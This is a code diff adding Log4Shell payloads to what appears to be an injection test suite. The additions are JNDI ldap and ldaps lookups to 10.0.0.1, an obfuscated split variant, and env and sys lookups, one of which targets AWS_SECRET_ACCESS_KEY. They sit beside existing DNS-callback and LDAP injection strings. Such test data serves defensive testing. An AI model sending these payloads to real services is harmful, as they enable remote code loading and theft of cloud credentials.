@@ -246,6 +246,14 @@ MISC_INJECTION_SUITE = [
         "${${lower:j}ndi:${lower:l}dap://10.0.0.1/a}",
     ),
     ("log4shell_jndi_dns", "header", "${jndi:dns://lookup.evil/a}"),
+    ("log4shell_jndi_ldaps", "header", "${jndi:ldaps://10.0.0.1/a}"),
+    (
+        "log4shell_jndi_split_default_values",
+        "header",
+        "${${::-j}${::-n}di:ldap://10.0.0.1/a}",
+    ),
+    ("log4shell_env_lookup", "header", "${env:AWS_SECRET_ACCESS_KEY}"),
+    ("log4shell_sys_lookup", "request_body", "${sys:java.version}"),
     ("ldap_injection_uid", "query_param", "*)(uid=*))(|(uid=*"),
     ("ldap_injection_password", "request_body", "admin*)((|password=*"),
     (
